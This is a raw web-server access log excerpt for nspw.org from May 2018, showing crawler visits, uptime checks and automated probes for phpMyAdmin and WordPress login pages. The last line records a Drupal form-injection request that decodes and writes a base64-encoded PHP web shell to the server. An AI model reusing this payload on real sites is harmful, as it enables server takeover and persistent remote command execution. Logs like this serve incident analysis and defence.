www.nspw.org:80 87.98.163.30 - - [01/May/2018:18:59:18 -0400] "GET /phpmyadmin/phpmyadmin/index.php HTTP/1.0" 302 592 "-" "Mozilla/5.0"
www.nspw.org:80 87.98.163.30 - - [01/May/2018:18:59:18 -0400] "GET /phpMyAdmin/phpMyAdmin/index.php HTTP/1.0" 302 592 "-" "Mozilla/5.0"
www.nspw.org:80 141.0.13.196 - - [01/May/2018:19:00:32 -0400] "GET /papers/1997/nspw1997-moskowitz.pdf HTTP/1.1" 302 597 "-" "Opera/9.80 (Android; Opera Mini/7.5.35721/95.90; U; en) Presto/2.12.423 Version/12.16"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:19:00:34 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 216.244.66.200 - - [01/May/2018:19:00:53 -0400] "GET /robots.txt HTTP/1.1" 302 493 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 157.55.39.70 - - [01/May/2018:19:01:34 -0400] "GET /2010/papers HTTP/1.1" 302 551 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
www.nspw.org:80 88.233.89.102 - - [01/May/2018:19:03:17 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 88.233.89.102 - - [01/May/2018:19:03:19 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 40.77.167.65 - - [01/May/2018:19:04:27 -0400] "GET /proceedings/2006/nspw2006-naegoe.pdf HTTP/1.1" 302 601 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:19:05:34 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 181.90.66.158 - - [01/May/2018:19:08:11 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 181.90.66.158 - - [01/May/2018:19:08:15 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:19:10:34 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 49.145.105.94 - - [01/May/2018:19:10:44 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 49.145.105.94 - - [01/May/2018:19:10:47 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 54.36.149.66 - - [01/May/2018:19:10:53 -0400] "GET /2005/pre-proceedings/Users/ HTTP/1.1" 302 527 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
www.nspw.org:80 59.124.153.166 - - [01/May/2018:19:12:28 -0400] "POST /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 302 980 "-" "curl/7.47.0"
